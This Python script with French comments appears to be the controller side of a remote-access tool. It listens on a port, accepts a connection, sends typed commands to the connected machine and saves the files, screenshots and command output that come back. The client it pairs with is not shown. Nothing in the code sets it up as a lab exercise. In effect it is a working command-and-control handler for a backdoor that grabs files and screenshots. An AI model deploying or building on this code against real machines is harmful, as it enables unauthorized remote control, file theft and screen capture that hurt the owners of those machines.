import socket

def receive_data(client_socket):
    """Recevoir des données avec une taille indiquée."""
    size_message = client_socket.recv(1024).decode("utf-8")
    if size_message.startswith("SIZE"):
        size = int(size_message.split()[1])
        client_socket.send("READY".encode("utf-8"))
        data = b""
        while len(data) < size:
            packet = client_socket.recv(4096)
            if not packet:
                break
            data += packet
        return data
    return b""

def send_data(client_socket, data):
    """Envoyer des données avec une indication de taille."""
    data = data.encode("utf-8") if isinstance(data, str) else data
    size = len(data)
    client_socket.sendall(f"SIZE {size}".encode("utf-8"))
    response = client_socket.recv(1024).decode("utf-8")
    if response == "READY":
        client_socket.sendall(data)

def start_server():
    host = "0.0.0.0"  # Écoute sur toutes les interfaces réseau
    port = 12345

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host, port))
    server_socket.listen(5)
    print(f"Serveur démarré sur {host}:{port}")

    client_socket, addr = server_socket.accept()
    print(f"Connexion acceptée de {addr}")

    while True:
        try:
            command = input("Entrez une commande ('exit' pour quitter) : ")
            send_data(client_socket, command)
            if command == "exit":
                break
            elif command.startswith("download "):
                file_data = receive_data(client_socket)
                filename = command.split()[1].split("/")[-1]
                with open(filename, "wb") as f:
                    f.write(file_data)
                print(f"Fichier téléchargé et enregistré sous {filename}")
            elif command == "screenshot":
                screenshot_data = receive_data(client_socket)
                with open("screenshot.png", "wb") as f:
                    f.write(screenshot_data)
                print("Capture d'écran enregistrée sous 'screenshot.png'")
            else:
                response = receive_data(client_socket)
                print(f"Réponse du client :\n{response}")

        except Exception as e:
            print(f"Erreur : {e}")
            break

    client_socket.close()
    server_socket.close()

if __name__ == "__main__":
    start_server()
